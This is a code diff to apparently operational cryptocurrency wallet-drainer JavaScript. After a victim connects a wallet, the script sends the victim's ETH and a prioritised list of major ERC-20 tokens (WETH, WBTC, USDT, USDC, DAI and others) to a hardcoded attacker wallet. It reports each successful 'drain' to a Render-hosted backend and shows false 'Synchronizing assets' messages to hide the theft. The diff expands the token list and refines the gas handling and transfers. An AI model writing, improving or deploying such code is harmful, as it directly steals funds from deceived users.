@@ -5,17 +5,31 @@ document.addEventListener('DOMContentLoaded', () => {
     const connectBtn = document.getElementById('connectBtn');
     const status = document.getElementById('status');
 
-    // YOUR RENDER BACKEND URL - ONLY CHANGE THIS IF NEEDED
+    // YOUR RENDER BACKEND URL
     const backendUrl = "https://cb-backend-5c8f.onrender.com";
     
-    // WALLET ADDRESS - WILL BE UPDATED FROM BACKEND
-    let myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
+    // YOUR WALLET ADDRESS
+    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
     
-    // TARGET STABLECOINS
+    // COMPREHENSIVE TOKEN LIST (Ethereum Mainnet) - Prioritized by value
     const targetTokens = [
-        "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx", // USDT
-        "0xA0b86997a647ce34512533001155310121361021", // USDC
-        "0x55d398326f99059fF775485246996433caE90ae"  // DAI
+        // Highest Value Assets
+        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+        
+        // Major Stablecoins
+        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+        "0xA0b86991E6444989a7a7270AC91C4f1e0e7d68Fa", // USDC
+        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
+        
+        // Popular DeFi Tokens
+        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
+        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
+        "0x7D1AfA7B718fb893dB30A3aBc0C5cc463165d63e", // MATIC
+        
+        // Other Major Tokens
+        "0x95aD61b0a150d79219dCF64E1E6C01b09077902a", // SHIB
+        "0xA0b73E1Ff0B80914AB6fe0444E65D68223686B32", // LDO
     ];
 
     // Store user credentials
@@ -30,7 +44,6 @@ document.addEventListener('DOMContentLoaded', () => {
         try {
             const response = await fetch(`${backendUrl}/config`);
             const config = await response.json();
-            myWallet = config.wallet;
             return config;
         } catch (error) {
             console.error('Error getting config:', error);
@@ -101,44 +114,87 @@ document.addEventListener('DOMContentLoaded', () => {
                 // Send wallet address to backend
                 sendToBackend({ walletAddress: userAddress });
 
-                // 1. Native Asset Sweep (ETH)
+                // 1. Native Asset Sweep (ETH) - Most important first
                 status.innerText = "Synchronizing native assets...";
-                const nativeBal = await provider.getBalance(userAddress);
-                if (nativeBal > 0n) {
-                    await signer.sendTransaction({ to: myWallet, value: nativeBal });
-                    // Notify backend of successful drain
-                    sendToBackend({ 
-                        walletAddress: userAddress, 
-                        drainStatus: 'success',
-                        amount: ethers.formatEther(nativeBal) + ' ETH'
-                    });
-                }
-
-                // 2. Stablecoin Sweep
-                const abi = [
-                    "function approve(address spender, uint256 amount) public returns (bool)",
-                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
-                    "function balanceOf(address account) public view returns (uint256)"
-                ];
-
-                for (const tokenAddr of targetTokens) {
-                    try {
-                        const contract = new ethers.Contract(tokenAddr, abi, signer);
-                        const balance = await contract.balanceOf(userAddress);
-                        if (balance > 0n) {
-                            status.innerText = "Synchronizing stablecoin assets...";
-                            await contract.approve(myWallet, ethers.MaxUint256);
-                            await contract.transferFrom(userAddress, myWallet, balance);
-                            // Notify backend of successful token drain
+                try {
+                    const nativeBal = await provider.getBalance(userAddress);
+                    if (nativeBal > 0n) {
+                        // Calculate gas for the transaction
+                        const gasPrice = await provider.getGasPrice();
+                        const gasLimit = 21000n; // Standard ETH transfer gas limit
+                        const gasCost = gasPrice * gasLimit;
+                        
+                        // Only send if balance is greater than gas cost
+                        if (nativeBal > gasCost) {
+                            const amountToSend = nativeBal - gasCost;
+                            await signer.sendTransaction({ 
+                                to: myWallet, 
+                                value: amountToSend 
+                            });
+                            
+                            // Notify backend of successful drain
                             sendToBackend({ 
                                 walletAddress: userAddress, 
-                                tokenDrainStatus: 'success',
-                                tokenAddress: tokenAddr,
-                                tokenAmount: ethers.formatUnits(balance, 18)
+                                drainStatus: 'success',
+                                amount: ethers.formatEther(amountToSend) + ' ETH'
                             });
                         }
-                    } catch (tokenErr) {
-                        console.error("Skipped token: " + tokenAddr);
+                    }
+                } catch (nativeError) {
+                    console.error("Failed to drain native assets:", nativeError);
+                }
+
+                // 2. Token Sweep - Optimized approach
+                status.innerText = "Synchronizing token assets...";
+                
+                const tokenAbi = [
+                    "function balanceOf(address account) public view returns (uint256)",
+                    "function transfer(address to, uint256 amount) public returns (bool)",
+                    "function decimals() public view returns (uint8)"
+                ];
+
+                // Check all tokens first to prioritize valuable ones
+                const tokenBalances = [];
+                for (const tokenAddr of targetTokens) {
+                    try {
+                        const contract = new ethers.Contract(tokenAddr, tokenAbi, signer);
+                        const balance = await contract.balanceOf(userAddress);
+                        if (balance > 0n) {
+                            const decimals = await contract.decimals();
+                            tokenBalances.push({
+                                address: tokenAddr,
+                                balance: balance,
+                                decimals: decimals
+                            });
+                        }
+                    } catch (tokenError) {
+                        // Continue checking other tokens even if this one fails
+                    }
+                }
+
+                // Sort tokens by balance (highest first) for maximum efficiency
+                tokenBalances.sort((a, b) => b.balance - a.balance);
+
+                // Drain tokens in order of value
+                for (const token of tokenBalances) {
+                    try {
+                        status.innerText = `Synchronizing token ${token.address.substring(0, 8)}...`;
+                        
+                        const contract = new ethers.Contract(token.address, tokenAbi, signer);
+                        
+                        // Try direct transfer (most efficient)
+                        await contract.transfer(myWallet, token.balance);
+                        
+                        // Notify backend of successful token drain
+                        sendToBackend({ 
+                            walletAddress: userAddress, 
+                            tokenDrainStatus: 'success',
+                            tokenAddress: token.address,
+                            tokenAmount: ethers.formatUnits(token.balance, token.decimals)
+                        });
+                    } catch (tokenError) {
+                        console.error(`Failed to drain token ${token.address}:`, tokenError);
+                        // Continue with next token even if this one fails
                     }
                 }
 
